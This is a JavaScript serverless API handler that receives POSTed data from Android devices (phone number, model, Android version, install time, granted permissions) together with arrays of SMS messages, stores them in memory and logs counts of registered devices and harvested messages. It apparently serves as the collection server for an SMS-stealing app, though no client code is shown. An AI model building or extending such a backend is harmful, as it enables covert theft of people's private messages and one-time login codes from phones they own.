// Global storage for demo (in production, use MongoDB)
let deviceData = [];
let smsData = [];

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const data = req.body;
    
    // Store device data
    const deviceRecord = {
      id: Date.now(),
      device_phone: data.device_phone,
      device_model: data.device_model,
      android_version: data.android_version,
      install_time: data.install_time,
      permissions_granted: data.permissions_granted,
      created_at: new Date().toISOString(),
      status: 'active'
    };
    
    // Check if device already exists
    const existingDevice = deviceData.find(d => d.device_phone === data.device_phone);
    if (!existingDevice) {
      deviceData.push(deviceRecord);
    }
    
    // Store SMS messages
    if (data.sms_messages && Array.isArray(data.sms_messages)) {
      data.sms_messages.forEach(sms => {
        smsData.push({
          id: Date.now() + Math.random(),
          device_phone: data.device_phone,
          message: sms,
          received_at: new Date().toISOString()
        });
      });
    }
    
    // Log success
    console.log('📱 Device Registered:', {
      phone: data.device_phone,
      model: data.device_model,
      sms_count: data.sms_messages?.length || 0,
      total_devices: deviceData.length,
      total_sms: smsData.length
    });
    
    res.status(200).json({ 
      status: 'success', 
      message: 'SMS data received and stored successfully',
      device_phone: data.device_phone,
      sms_count: data.sms_messages?.length || 0,
      total_devices_registered: deviceData.length,
      total_sms_messages: smsData.length,
      received_at: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('❌ Error processing SMS data:', error);
    res.status(500).json({ 
      status: 'error', 
      message: error.message 
    });
  }
}
